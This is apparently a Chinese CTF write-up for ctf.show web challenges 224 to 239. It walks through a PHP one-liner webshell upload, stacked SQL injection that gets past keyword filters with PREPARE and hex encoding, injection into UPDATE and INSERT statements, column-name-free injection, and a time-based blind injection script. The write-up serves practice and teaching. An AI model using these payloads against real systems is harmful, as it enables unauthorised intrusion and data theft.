<p>扫描一下发现有<code>robots.txt,upload.php</code>啥的，访问<code>robots.txt</code>，会有一个<code>pwdreset.php</code>，重置一下密码登录就是一个上传的点。</p>
<p>这里怎么考的是文件上传加上sql注入，用群主的<code>payload.bin</code>传上去试一下，这个用010打开可以看到一句话的16进制<code>0x3c3f3d60245f4745545b315d603f3e</code>，密码对应1，get传参。</p>
<p>payload.bin的内容:</p>
<p><img src="https://img.picui.cn/free/2024/11/13/67340f8c733f0.png" alt="web224_1.png"></p>
<p>对应的一句话木马脚本为:</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?=</span>`<span class="variable">$_GET</span>[<span class="number">1</span>]`<span class="meta">?&gt;</span>  <span class="comment">//相当于 system($1);</span></span><br></pre></td></tr></table></figure>

<p>可以查看一下<code>upload.php</code>的代码：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">	<span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line">	<span class="keyword">if</span> (<span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;error&quot;</span>] &gt; <span class="number">0</span>)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="keyword">die</span>(<span class="string">&quot;Return Code: &quot;</span> . <span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;error&quot;</span>] . <span class="string">&quot;&lt;br /&gt;&quot;</span>);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">if</span>(<span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;size&quot;</span>]&gt;<span class="number">10</span>*<span class="number">1024</span>)&#123;</span><br><span class="line">		<span class="keyword">die</span>(<span class="string">&quot;文件过大: &quot;</span> .(<span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;size&quot;</span>] / <span class="number">1024</span>) . <span class="string">&quot; Kb&lt;br /&gt;&quot;</span>);</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">file_exists</span>(<span class="string">&quot;upload/&quot;</span> . <span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;name&quot;</span>]))</span><br><span class="line">      &#123;</span><br><span class="line">      <span class="keyword">echo</span> <span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;name&quot;</span>] . <span class="string">&quot; already exists. &quot;</span>;</span><br><span class="line">      &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">      &#123;</span><br><span class="line">	  <span class="variable">$filename</span> = <span class="title function_ invoke__">md5</span>(<span class="title function_ invoke__">md5</span>(<span class="title function_ invoke__">rand</span>(<span class="number">1</span>,<span class="number">10000</span>))).<span class="string">&quot;.zip&quot;</span>;</span><br><span class="line">      <span class="variable">$filetype</span> = (<span class="keyword">new</span> finfo)-&gt;<span class="title function_ invoke__">file</span>(<span class="variable">$_FILES</span>[<span class="string">&#x27;file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>]);</span><br><span class="line">      <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/image|png|bmap|jpg|jpeg|application|text|audio|video/i&quot;</span>,<span class="variable">$filetype</span>))&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;file type error&quot;</span>);</span><br><span class="line">      &#125;</span><br><span class="line">	  <span class="variable">$filepath</span> = <span class="string">&quot;upload/&quot;</span>.<span class="variable">$filename</span>;</span><br><span class="line">	  <span class="variable">$sql</span> = <span class="string">&quot;INSERT INTO file(filename,filepath,filetype) VALUES (&#x27;&quot;</span>.<span class="variable">$filename</span>.<span class="string">&quot;&#x27;,&#x27;&quot;</span>.<span class="variable">$filepath</span>.<span class="string">&quot;&#x27;,&#x27;&quot;</span>.<span class="variable">$filetype</span>.<span class="string">&quot;&#x27;);&quot;</span>;</span><br><span class="line">      <span class="title function_ invoke__">move_uploaded_file</span>(<span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;tmp_name&quot;</span>],</span><br><span class="line">      <span class="string">&quot;upload/&quot;</span> . <span class="variable">$filename</span>);</span><br><span class="line">	  <span class="variable">$con</span> = <span class="title function_ invoke__">mysqli_connect</span>(<span class="string">&quot;localhost&quot;</span>,<span class="string">&quot;root&quot;</span>,<span class="string">&quot;root&quot;</span>,<span class="string">&quot;ctf&quot;</span>);</span><br><span class="line">		<span class="keyword">if</span> (!<span class="variable">$con</span>)</span><br><span class="line">		&#123;</span><br><span class="line">			<span class="keyword">die</span>(<span class="string">&#x27;Could not connect: &#x27;</span> . <span class="title function_ invoke__">mysqli_error</span>());</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">if</span> (<span class="title function_ invoke__">mysqli_multi_query</span>(<span class="variable">$con</span>, <span class="variable">$sql</span>)) &#123;</span><br><span class="line">			<span class="title function_ invoke__">header</span>(<span class="string">&quot;location:filelist.php&quot;</span>);</span><br><span class="line">		&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">			<span class="keyword">echo</span> <span class="string">&quot;Error: &quot;</span> . <span class="variable">$sql</span> . <span class="string">&quot;&lt;br&gt;&quot;</span> . <span class="title function_ invoke__">mysqli_error</span>(<span class="variable">$con</span>);</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="title function_ invoke__">mysqli_close</span>(<span class="variable">$con</span>);</span><br><span class="line">      &#125;</span><br><span class="line">    </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<h3 id="反思-11"><a href="#反思-11" class="headerlink" title="反思"></a>反思</h3><p>1.注入点的找取，思维发散。</p>
<p>2.我将payload十六进制改成<code>&lt;?php eval($_POST[1]);?&gt;</code>的16进制编码之后，发现不能成功写进去一句话，没搞清楚原因，希望懂得师傅能解答下！</p>
<h2 id="web225"><a href="#web225" class="headerlink" title="web225"></a>web225</h2><p>查询语句:<code>$sql = &quot;select id,username,pass from ctfshow_user where username = &#39;&#123;$username&#125;&#39;;&quot;;</code></p>
<p>返回逻辑：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//师傅说过滤的越多越好</span></span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/file|into|dump|union|select|update|delete|alter|drop|create|describe|set/i&#x27;</span>,<span class="variable">$username</span>))&#123;</span><br><span class="line">  <span class="keyword">die</span>(<span class="title function_ invoke__">json_encode</span>(<span class="variable">$ret</span>));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="方法一"><a href="#方法一" class="headerlink" title="方法一"></a>方法一</h3><p>flag不在<code>ctfshow_user</code>里面，这里先通过<code>?username=ctfshow&#39;;show tables;</code> 找到flag表的位置，然后通过<code>handler</code>来去读flag</p>
<p>最终payload:</p>
<p><code>https://02490d20-8e3b-4955-b83b-1499993a0c4c.challenge.ctf.show/api/?username=ctfshow&#39;;show tables;handler ctfshow_flagasa open;handler ctfshow_flagasa read first;</code></p>
<h3 id="方法二"><a href="#方法二" class="headerlink" title="方法二"></a>方法二</h3><p>这里还有一个方式，是用预编译<code>PREPARE</code> ，利用<code>concat</code>拼接来绕过<code>select</code>过滤。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">https://02490d20-8e3b-4955-b83b-1499993a0c4c.challenge.ctf.show/api/?username=user1&#x27;;PREPARE My0n9s from concat(&#x27;se&#x27;,&#x27;lect&#x27;,&#x27; database()&#x27;);EXECUTE My0n9s;</span><br><span class="line"></span><br><span class="line">https://02490d20-8e3b-4955-b83b-1499993a0c4c.challenge.ctf.show/api/?username=user1&#x27;;PREPARE My0n9s from concat(&#x27;se&#x27;,&#x27;lect&#x27;,&#x27; * from ctfshow_flagasa&#x27;);EXECUTE My0n9s;</span><br></pre></td></tr></table></figure>

<h2 id="web226"><a href="#web226" class="headerlink" title="web226"></a>web226</h2><p>题目：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">查询语句: <span class="variable">$sql</span> = <span class="string">&quot;select id,username,pass from ctfshow_user where username = &#x27;<span class="subst">&#123;$username&#125;</span>&#x27;;&quot;</span>;</span><br><span class="line">返回逻辑:</span><br><span class="line">  <span class="comment">//师傅说过滤的越多越好</span></span><br><span class="line">  <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/file|into|dump|union|select|update|delete|alter|drop|create|describe|set|show|\(/i&#x27;</span>,<span class="variable">$username</span>))&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="title function_ invoke__">json_encode</span>(<span class="variable">$ret</span>));</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure>

<p>在上题的基础上过滤了<code>set,show,(</code>，我们可以直接用16进制编码来绕过。最终的payload:<code>user1&#39;;PREPARE My0n9s from 0x73656c656374202a2066726f6d2063746673685f6f775f666c61676173;EXECUTE My0n9s;</code>，这里的16进制编码对应<code>select * from ctfsh_ow_flagas</code></p>
<h2 id="web227"><a href="#web227" class="headerlink" title="web227"></a>web227</h2><p>题目:</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">查询语句: <span class="variable">$sql</span> = <span class="string">&quot;select id,username,pass from ctfshow_user where username = &#x27;<span class="subst">&#123;$username&#125;</span>&#x27;;&quot;</span>;</span><br><span class="line">返回逻辑：</span><br><span class="line">  <span class="comment">//师傅说过滤的越多越好</span></span><br><span class="line"> <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/file|into|dump|union|select|update|delete|alter|drop|create|describe|set|show|db|\,/i&#x27;</span>,<span class="variable">$username</span>))&#123;</span><br><span class="line">   <span class="keyword">die</span>(<span class="title function_ invoke__">json_encode</span>(<span class="variable">$ret</span>));</span><br><span class="line"> &#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>在上题目的基础上过滤了<code>db</code>，这里flag不在任何表里面，也不在某个文件里面。所以单纯找是找不到的。这个题目考察的<code>mysql存储过程</code></p>
<p>具体原理可以参考<code>[MySQL——查看存储过程和函数_mysql 查询function-CSDN博客](https://blog.csdn.net/qq_41573234/article/details/80411079)</code></p>
<p>核心是<code>select * from information_schema.routines</code>，也是用16进制编码一下，然后用预编译去打。 </p>
<p>payload:<code>https://5d50f7f6-0dcf-4dd0-87df-0eb7e906b28f.challenge.ctf.show/api/?username=user1&#39;;PREPARE My0n9s from 0x53454c454354202a2046524f4d20696e666f726d6174696f6e5f736368656d612e526f7574696e6573;EXECUTE My0n9s;</code></p>
<h2 id="web228"><a href="#web228" class="headerlink" title="web228"></a>web228</h2><p>题目：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">查询语句：</span><br><span class="line"> <span class="variable">$sql</span> = <span class="string">&quot;select id,username,pass from ctfshow_user where username = &#x27;<span class="subst">&#123;$username&#125;</span>&#x27;;&quot;</span>;</span><br><span class="line"> <span class="variable">$bansql</span> = <span class="string">&quot;select char from banlist;&quot;</span>;</span><br><span class="line">返回逻辑：</span><br><span class="line">  <span class="comment">//师傅说内容太多，就写入数据库保存</span></span><br><span class="line"> <span class="keyword">if</span>(<span class="title function_ invoke__">count</span>(<span class="variable">$banlist</span>)&gt;<span class="number">0</span>)&#123;</span><br><span class="line">   <span class="keyword">foreach</span> (<span class="variable">$banlist</span> <span class="keyword">as</span> <span class="variable">$char</span>) &#123;</span><br><span class="line">     <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/&quot;</span>.<span class="variable">$char</span>.<span class="string">&quot;/i&quot;</span>, <span class="variable">$username</span>))&#123;</span><br><span class="line">       <span class="keyword">die</span>(<span class="title function_ invoke__">json_encode</span>(<span class="variable">$ret</span>));</span><br><span class="line">     &#125;</span><br><span class="line">   &#125;</span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure>

<p>看上去过滤了很多，其实还是可以用之前的思路来打，预编译+16进制来绕过。</p>
<p>payload:<code>https://1bb603aa-63e4-4898-b00c-4a21e4e40bdc.challenge.ctf.show/api?username=user1%27;PREPARE%20My0n9s%20from%200x73686f77207461626c65733b;EXECUTE%20My0n9s;</code> ，通过<code>show tables;</code>来得到表名，最后在<code>select * from ctfsh_ow_flagasaa</code>来拿flag。</p>
<p>final_payload:<code>https://1bb603aa-63e4-4898-b00c-4a21e4e40bdc.challenge.ctf.show/api/?username=user1%27;PREPARE%20My0n9s%20from%200x73656c656374202a2066726f6d2063746673685f6f775f666c6167617361613b;EXECUTE%20My0n9s;</code></p>
<h2 id="web229"><a href="#web229" class="headerlink" title="web229"></a>web229</h2><p>和上面一样的思路</p>
<p><code>https://029a563a-53a0-4837-9c6f-daaf526122ba.challenge.ctf.show/api/?username=user1%27;PREPARE%20My0n9s%20from%200x73686f77207461626c65733b;EXECUTE%20My0n9s;</code> </p>
<p>先拿到表名<code>flag</code>，然后再继续读flag表：</p>
<p><code>https://029a563a-53a0-4837-9c6f-daaf526122ba.challenge.ctf.show/api/?username=user1%27;PREPARE%20My0n9s%20from%200x73656c656374202a2066726f6d20666c61673b;EXECUTE%20My0n9s;</code></p>
<h2 id="web230"><a href="#web230" class="headerlink" title="web230"></a>web230</h2><p>和上面一样的思路，不赘述。</p>
<h2 id="web231"><a href="#web231" class="headerlink" title="web231"></a>web231</h2><p>题目：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">查询语句： <span class="comment">//分页查询</span></span><br><span class="line"> <span class="variable">$sql</span> = <span class="string">&quot;update ctfshow_user set pass = &#x27;<span class="subst">&#123;$password&#125;</span>&#x27; where username = &#x27;<span class="subst">&#123;$username&#125;</span>&#x27;;&quot;</span>;</span><br><span class="line">返回逻辑：</span><br><span class="line"><span class="comment">//无过滤</span></span><br></pre></td></tr></table></figure>

<p>这个虽然是update语句，但是我们依然可以通过<strong>可控的参数</strong>来<strong>注入SQL语句</strong>，<strong>让它去执行</strong>，这就是我们的目的。</p>
<p>payload:</p>
<p><img src="https://img.picgo.net/2024/11/14/web231_1fbefcba2ee53bfa4.png" alt="web231 1"></p>
<p>payload : <code>password=1&#39;,username=user() where 1=1;#&amp;username=1</code></p>
<p>带入进去SQL语句就是<code>update ctfshow_user set pass = &#39;1&#39;,username=user() where 1=1;#&#39; where username = &#39;1&#39;;</code></p>
<p>实际执行的就是<code>update ctfshow_user set pass=&#39;1&#39;,username=user() where 1=1</code> ，<code>#</code>后面都注释掉了。</p>
<p>可以看到成功改写：</p>
<p><img src="https://img.picgo.net/2024/11/14/web231_26059fee78c7235fb.png" alt="web231 2"></p>
<p>这题没有过滤，接下来就是用查询的思路，去依次爆数据库、表名、字段名、值。</p>
<p>获取数据库：<code>password=1&#39;,username=(select database()) where 1=1#&amp;username=1</code></p>
<p>获取表名: <code>password=1&#39;,username=(select group_concat(table_name)from information_schema.tables where table_schema=&#39;ctfshow_web&#39;) where 1=1#&amp;username=1</code></p>
<p>获取<code>flaga</code>表的字段名: <code>password=1&#39;,username=(select group_concat(column_name)from information_schema.columns where table_name=&#39;flaga&#39;) where 1=1#&amp;username=1</code></p>
<p>获取值:  <code>password=1&#39;,username=(select flagas from flaga) where 1=1#&amp;username=1</code></p>
<h2 id="web232"><a href="#web232" class="headerlink" title="web232"></a>web232</h2><p>题目：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">查询语句：</span><br><span class="line">  <span class="comment">//分页查询</span></span><br><span class="line">  <span class="variable">$sql</span> = <span class="string">&quot;update ctfshow_user set pass = md5(&#x27;<span class="subst">&#123;$password&#125;</span>&#x27;) where username = &#x27;<span class="subst">&#123;$username&#125;</span>&#x27;;&quot;</span>;</span><br><span class="line">返回逻辑：</span><br><span class="line">  无过滤</span><br></pre></td></tr></table></figure>

<p>这个题目和上一题的逻辑是一模一样的，只是<strong>闭合方式不一样</strong>，这里就不赘述了，直接给payload:</p>
<p><code>password=1&#39;),username=user() where 1=1#&amp;username=1</code>，后面也是依次获取库、表、字段。</p>
<h2 id="web233"><a href="#web233" class="headerlink" title="web233"></a>web233</h2><p>题目:</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//分页查询</span></span><br><span class="line"><span class="variable">$sql</span> = <span class="string">&quot;update ctfshow_user set pass = &#x27;<span class="subst">&#123;$password&#125;</span>&#x27; where username = &#x27;<span class="subst">&#123;$username&#125;</span>&#x27;;&quot;</span>;</span><br></pre></td></tr></table></figure>

<p>给的查询语句和之前一样，用原来的payload打不通这个，所以换个思路，换成盲注，其实因为这里有个<code>where username=xxx</code>，可以尝试在这里去进行盲注。</p>
<p>这里我试了一下<code>pasword=1&amp;username=user1&#39;and 1#</code> 和 <code>password=1&amp;username=user1&#39;amd 0#</code> 发现<code>password=1&amp;username=user1&#39;or 1#</code>和<code>password=1&amp;username=user1&#39; or 0#</code>  。 得到的回显是一样的。所以这里布尔盲注走不通。</p>
<p>尝试一下时间盲注，发现是造成延时的。然后就是上脚本：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> datetime</span><br><span class="line">url = <span class="string">&quot;http://797a704c-c060-4ac9-a177-9a87e052787a.challenge.ctf.show/api//index.php&quot;</span></span><br><span class="line">result = <span class="string">&#x27;&#x27;</span></span><br><span class="line">i = <span class="number">0</span></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    i = i + <span class="number">1</span></span><br><span class="line">    head = <span class="number">32</span></span><br><span class="line">    tail = <span class="number">127</span></span><br><span class="line">    <span class="keyword">while</span> head &lt; tail:</span><br><span class="line">        mid = (head + tail) &gt;&gt; <span class="number">1</span></span><br><span class="line">        payload = <span class="string">f&quot;user1&#x27; or if(ascii(substr((select database()),<span class="subst">&#123;i&#125;</span>,1))&gt;<span class="subst">&#123;mid&#125;</span>,sleep(0.09),1)#&quot;</span></span><br><span class="line">        t1=datetime.datetime.now()</span><br><span class="line">        data=&#123;<span class="string">&quot;password&quot;</span>:<span class="number">1</span>,<span class="string">&quot;username&quot;</span>:payload&#125;</span><br><span class="line">        r = requests.post(url=url,data=data)</span><br><span class="line">        t2=datetime.datetime.now()</span><br><span class="line">        <span class="keyword">if</span> (t2-t1).seconds &gt; <span class="number">0.5</span>:</span><br><span class="line">            head = mid + <span class="number">1</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            tail = mid</span><br><span class="line">    <span class="keyword">if</span> head != <span class="number">32</span>:</span><br><span class="line">        result += <span class="built_in">chr</span>(head)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    <span class="built_in">print</span>(result)</span><br></pre></td></tr></table></figure>

<p>在之前脚本基础上改改就能用了。</p>
<h2 id="web234"><a href="#web234" class="headerlink" title="web234"></a>web234</h2><p>题目：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">//分页查询</span><br><span class="line"> $sql = &quot;update ctfshow_user set pass = &#x27;&#123;$password&#125;&#x27; where username = &#x27;&#123;$username&#125;&#x27;;&quot;;</span><br></pre></td></tr></table></figure>

<p>这里题目说没过滤，其实还是有过滤的，这个题目是把单引号过滤了，所以我们不能用单引号去闭合。但是我们可以用<code>\</code>去转义，来实现引号逃逸。</p>
<p>比如<code>password=\&amp;username=,username=user()#</code> ，带入进去就是:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">update ctfshow_user set pass=&#x27;\&#x27;where username=&#x27;,username=user()#&#x27;;</span><br></pre></td></tr></table></figure>

<p>这里的引号被转义了，所以会一直往后面吃，直到遇到下一个引号去闭合。</p>
<p>获取数据库:<code>username=,username=database()#&amp;password=\</code></p>
<p>获取表名：<code>username=,username=(select group_concat(table_name)from information_schema.tables where table_schema=&quot;ctfshow_web&quot;)#&amp;password=\</code>，这里过滤了单引号，所以得用双引号。</p>
<p>获取字段名:<code>username=,username=(select group_concat(column_name)from information_schema.columns where table_name=&quot;flag23a&quot;)#&amp;password=\</code></p>
<p>获取值：<code>username=,username=(select flagass23s3 from flag23a)#&amp;password=\</code></p>
<h2 id="web235"><a href="#web235" class="headerlink" title="web235"></a>web235</h2><p>题目：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">//分页查询</span><br><span class="line">$sql = &quot;update ctfshow_user set pass = &#x27;&#123;$password&#125;&#x27; where username = &#x27;&#123;$username&#125;&#x27;;&quot;;</span><br><span class="line">//过滤 or &#x27; </span><br></pre></td></tr></table></figure>

<p>过滤了<code>空格</code>、<code>or</code>、还有<code>&#39;</code>。</p>
<p>空格和引号被过滤了，这个都好说，我们还是可以沿用上一题的思路，但是这里有个问题，就是过滤了<code>or</code>，那么<code>information_schema.tables</code>，<code>information_schema.columns</code>，这些都用不了了。</p>
<p>这里对于<code>information_schema.tables</code> 有替代的，比如：<code>mysql.innodb_table_stats</code>和<code>mysql.innodb_index_stats</code>。</p>
<p>所以我们可以先把表名弄出来，payload：</p>
<p><code>password=\&amp;username=,username=(select/**/group_concat(table_name)from/**/mysql.innodb_table_stats)#</code>，注意这里和<code>information_schema.tables</code>不太一样，不需要去指明<code>where table_schema=&quot;ctfshow_web&quot;</code>，但是这里是<code>where database_name=database()</code>,只不过我这里不指明数据库，也可以正常打。</p>
<p>可以看到我们成功的把表名注入出来了：</p>
<p><img src="https://img.picgo.net/2024/11/14/web2353ce6dc7f92aefed9.png" alt="web235"> </p>
<p>到这里问题来了，因为找不到能够等效<code>information_schema.columns</code>的，所以我们这里不能直接注入出字段名，即列名。就要通过无列名来注入，有一篇文章写的很好：<code>[CTF|mysql之无列名注入 - 知乎](https://zhuanlan.zhihu.com/p/98206699)</code></p>
<p>payload:<code>password=\&amp;username=,username=(select ``(select 1,2,3 union select * from flag23a1)b)#</code></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">password=\&amp;username=,username=(select%09`2`%09from(select%091,2,3%09union%09select%09*%09from%09flag23a1)b%09limit 1,1)#</span><br></pre></td></tr></table></figure>

<p>注意这里在进行无列名注入的时候，要保证你构建表的列数和<code>flag23a1表</code>的列数是一致，这里<code>flag23a1</code>是3列，所以这里是<code>select 1,2,3 union select xx</code>，然后查询字段的时候数字要带上&#96;&#96;，反引号。当然如果这里过滤了反引号，我们可以用起别名的方式来绕过。</p>
<p>如下:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">password=\&amp;username=,username=(select%09c%09from(select%091,2%09as%09c,3%09union%09select%09*%09from%09flag23a1)b%09limit 1,1)#</span><br></pre></td></tr></table></figure>

<p>核心的地方就是<code>select c from (select 1,2,3 union select * from flag23a1)b</code></p>
<p><code>limit m,n</code> :  从第m条记录开始，返回n条记录。</p>
<h2 id="web236"><a href="#web236" class="headerlink" title="web236"></a>web236</h2><p>题目：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">查询语句:</span><br><span class="line">  //分页查询</span><br><span class="line">  $sql = &quot;update ctfshow_user set pass = &#x27;&#123;$password&#125;&#x27; where username = &#x27;&#123;$username&#125;&#x27;;&quot;;</span><br><span class="line">返回逻辑：</span><br><span class="line">  //过滤 or &#x27; flag</span><br></pre></td></tr></table></figure>

<p>很奇怪，这个题目说过滤了flag，表名也是<code>flaga</code>，但是还是可以用上题的脚本去打出来。</p>
<h2 id="web237"><a href="#web237" class="headerlink" title="web237"></a>web237</h2><p>题目：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$sql = &quot;insert into ctfshow_user(username,pass) value(&#x27;&#123;$username&#125;&#x27;,&#x27;&#123;$password&#125;&#x27;);&quot;;</span><br><span class="line">无过滤</span><br></pre></td></tr></table></figure>

<p>这个注入和update注入一样，也是找到对应的点去注入。</p>
<p>我们可以传<code>username=1&#39;,user())#&amp;password=1</code>，带入进去就是<code>insert into ctfshow_user(username,pass)value(&#39;1&#39;,user())#&#39;,&#39;1&#39;);</code></p>
<p>相当于<code>insert into ctfshow_user(username,pass)value(&#39;1&#39;,user())</code> ，然后后面的思路是一样的。。</p>
<p>这里有个问题就是传参点，一开始搞了半天，还以为是在&#x2F;api&#x2F;index.php那里传。。。其实是在首页的添加按钮那里去传。。：</p>
<p><img src="https://img.picgo.net/2024/11/14/web237a15cde6c44b35c14.png" alt="web237"></p>
<p>日了狗了哈哈哈。</p>
<h2 id="web238"><a href="#web238" class="headerlink" title="web238"></a>web238</h2><p>题目:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">//插入数据</span><br><span class="line">$sql = &quot;insert into ctfshow_user(username,pass) value(&#x27;&#123;$username&#125;&#x27;,&#x27;&#123;$password&#125;&#x27;);&quot;;</span><br><span class="line">返回逻辑</span><br><span class="line">过滤了空格</span><br></pre></td></tr></table></figure>

<p>在上一题基础上过滤了空格，像<code>%09,%0a,%0d,%0c</code>都用不了，但是这里可以用括号去绕过。</p>
<p>获取数据库:<code>username=1&#39;,(select(database())))#&amp;password=1</code></p>
<p>获取表名:<code>username=1&#39;,(select(group_concat(table_name))from(information_schema.tables)where(table_schema=database())))#&amp;password=1</code></p>
<p>获取表的字段名(列名): </p>
<p><code>username=1&#39;,(select(group_concat(column_name))from(information_schema.columns)where(table_name=0x666c616762)))#&amp;password=1</code></p>
<p>获取字段的值:</p>
<p><code>username=1&#39;,(select(flag)from(flagb)))#&amp;password=1</code></p>
<h2 id="web239"><a href="#web239" class="headerlink" title="web239"></a>web239</h2><p>题目：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">//插入数据</span><br><span class="line">$sql = &quot;insert into ctfshow_user(username,pass) value(&#x27;&#123;$username&#125;&#x27;,&#x27;&#123;$password&#125;&#x27;);&quot;;</span><br><span class="line">返回逻辑</span><br><span class="line">过滤了空格，or</span><br></pre></td></tr></table></figure>

<p>在上一题的基础上过滤了<code>or</code>，和之前的update一样，不能用<code>information_schema</code> 这个了。所以得换一个注入出表名然后进行无列名注入。</p>
<p>注数据库:<code>username=1&#39;,(select(database())))#&amp;password=1</code></p>
